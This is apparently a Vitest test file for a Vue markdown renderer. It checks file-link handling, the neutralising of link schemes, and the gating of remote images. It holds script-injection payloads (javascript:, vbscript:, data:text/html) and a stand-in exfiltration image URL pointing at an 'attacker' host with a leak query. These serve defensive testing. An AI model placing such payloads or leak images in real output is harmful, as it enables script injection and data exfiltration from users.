// @vitest-environment happy-dom
import { describe, it, expect, vi } from 'vitest';
import { mount } from '@vue/test-utils';
import MarkdownRenderer from '../MarkdownRenderer.vue';
import { i18n } from '@/i18n';
import type { WebviewToExtensionMessage } from '@shared/types/messages';

const posted = vi.hoisted((): WebviewToExtensionMessage[] => []);
vi.mock('@/composables/usePlatformBridge', () => ({
  usePlatformBridge: () => ({ postMessage: (m: WebviewToExtensionMessage) => posted.push(m) }),
}));

describe('MarkdownRenderer file links', () => {
  it.each([
    ['~/.bashrc', '~/.bashrc'],
    ['~', '~'],
    ['~\\notes.txt', '~\\notes.txt'],
    ['src/a.ts', './src/a.ts'],
    ['~notes.txt', './~notes.txt'],
  ])('sends a link to %s to core as %s', async (href, filePath) => {
    posted.length = 0;
    const wrapper = mount(MarkdownRenderer, { global: { plugins: [i18n] }, props: { content: `[x](<${href}>)` } });
    await wrapper.find('a').trigger('click');
    expect(posted).toEqual([{ type: 'openFile', filePath }]);
  });

  // A URL parser reads these as a scheme, so they never reach the browser as a URL: the link's href is '#'.
  it.each([
    ['utils.ts:42', { filePath: './utils.ts', line: 42 }],
    ['utils.ts:42:7', { filePath: './utils.ts', line: 42 }],
    ['vite.config.ts:3', { filePath: './vite.config.ts', line: 3 }],
    ['src/a.ts:42:7', { filePath: './src/a.ts', line: 42 }],
    ['utils.ts:42-50', { filePath: './utils.ts', line: 42 }],
    ['src/a.ts:42-50', { filePath: './src/a.ts', line: 42 }],
    ['C:/x/a.ts:42-50', { filePath: 'C:/x/a.ts', line: 42 }],
    ['C:/x/a.ts', { filePath: 'C:/x/a.ts' }],
    ['C:/x/a.ts:42', { filePath: 'C:/x/a.ts', line: 42 }],
    ['d:\\x\\a.ts', { filePath: 'd:\\x\\a.ts' }],
  ])('opens a link to %s as a file', async (href, opened) => {
    posted.length = 0;
    const wrapper = mount(MarkdownRenderer, { global: { plugins: [i18n] }, props: { content: `[x](<${href}>)` } });
    const link = wrapper.get('a');
    if (/^[A-Za-z][\w.]*:/.test(href)) expect(link.attributes('href')).toBe('#');
    expect(link.attributes('target')).toBeUndefined();
    const click = new MouseEvent('click', { bubbles: true, cancelable: true });
    link.element.dispatchEvent(click);
    expect(click.defaultPrevented).toBe(true);
    expect(posted).toEqual([{ type: 'openFile', ...opened }]);
  });

  it.each([
    'javascript:alert(1)',
    'JaVaScRiPt:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
    'a:javascript',
    'x.js:alert(1)',
    'x.js:1:alert(1)',
    'x.js:1;alert(1)',
    'x.js:1-alert(1)',
    'x.js:1-2:alert(1)',
    'x.js:1:2-3',
    'c://host/x',
    'c:javascript:alert(1)',
    'ab:/x',
  ])('keeps a link to %s dead', async (href) => {
    posted.length = 0;
    const wrapper = mount(MarkdownRenderer, { global: { plugins: [i18n] }, props: { content: `[x](<${href}>)` } });
    const link = wrapper.get('a');
    expect(link.attributes('href')).toBe('#');
    await link.trigger('click');
    expect(posted).toEqual([]);
  });

  it('leaves a file: URL to the sanitizer and the local-path handler', async () => {
    posted.length = 0;
    const wrapper = mount(MarkdownRenderer, { global: { plugins: [i18n] }, props: { content: '[x](file:///repo/a.ts:9)' } });
    expect(wrapper.get('a').attributes('href')).toBe('file:///repo/a.ts:9');
    await wrapper.get('a').trigger('click');
    expect(posted).toEqual([{ type: 'openFile', filePath: '/repo/a.ts', line: 9 }]);
  });

  it('treats no link of fetched web content as a local file', async () => {
    posted.length = 0;
    const wrapper = mount(MarkdownRenderer, { global: { plugins: [i18n] }, props: { content: '[x](<C:/x/a.ts>) [y](<utils.ts:42>)', baseUrl: 'https://example.com/docs/' } });
    for (const link of wrapper.findAll('a')) {
      expect(link.attributes('href')).toBe('#');
      await link.trigger('click');
    }
    expect(posted).toEqual([]);
  });
});

const REMOTE = '![x](https://attacker/leak?d=1)';
const DATA_IMG = '![y](data:image/png;base64,iVBORw0KGgo=)';

describe('MarkdownRenderer remote-image gating', () => {
  it('blocks remote images and shows a host placeholder with zero image nodes', () => {
    const wrapper = mount(MarkdownRenderer, {
      global: { plugins: [i18n] },
      props: { content: REMOTE, allowRemoteImages: false },
    });

    // Absence of the <img> node under happy-dom IS the zero-network guarantee.
    expect(wrapper.findAll('img[src^="https://attacker"]')).toHaveLength(0);
    const button = wrapper.find('button');
    expect(button.exists()).toBe(true);
    expect(button.text()).toContain('attacker');
  });

  it('loads the remote image only after the placeholder is clicked', async () => {
    const wrapper = mount(MarkdownRenderer, {
      global: { plugins: [i18n] },
      props: { content: REMOTE, allowRemoteImages: false },
    });

    expect(wrapper.find('img').exists()).toBe(false);

    await wrapper.find('button').trigger('click');

    const img = wrapper.find('img[src="https://attacker/leak?d=1"]');
    expect(img.exists()).toBe(true);
  });

  it('renders remote images immediately when the prop is omitted (chat unchanged)', () => {
    const wrapper = mount(MarkdownRenderer, {
      global: { plugins: [i18n] },
      props: { content: REMOTE },
    });

    expect(wrapper.find('img[src="https://attacker/leak?d=1"]').exists()).toBe(true);
    expect(wrapper.find('button').exists()).toBe(false);
  });

  it('renders data: images immediately even when remote images are blocked', () => {
    const wrapper = mount(MarkdownRenderer, {
      global: { plugins: [i18n] },
      props: { content: DATA_IMG, allowRemoteImages: false },
    });

    expect(wrapper.find('img[src^="data:image/png"]').exists()).toBe(true);
    expect(wrapper.find('button').exists()).toBe(false);
  });

  it.each([
    ['uppercase scheme', '![x](HTTPS://attacker/leak?d=1)'],
    ['scheme-relative', '![x](//attacker/leak?d=1)'],
    ['plain http', '![x](http://attacker/leak?d=1)'],
  ])('gates %s behind the placeholder (no eager img)', (_label, content) => {
    const wrapper = mount(MarkdownRenderer, {
      global: { plugins: [i18n] },
      props: { content, allowRemoteImages: false },
    });

    expect(wrapper.find('img').exists()).toBe(false);
    expect(wrapper.find('button').exists()).toBe(true);
  });

  it('renders a sanitized-away (data:text/html) image src as a static blocked label, not a clickable placeholder', () => {
    const wrapper = mount(MarkdownRenderer, {
      global: { plugins: [i18n] },
      props: { content: '![x](DATA:text/html,<b>x</b>)', allowRemoteImages: false },
    });

    // '#' sanitized src is not loadable: no img, and no click-to-load button that would fetch '#'.
    expect(wrapper.find('img').exists()).toBe(false);
    expect(wrapper.find('button').exists()).toBe(false);
    expect(wrapper.find('.markdown-image-blocked').exists()).toBe(true);
  });
});
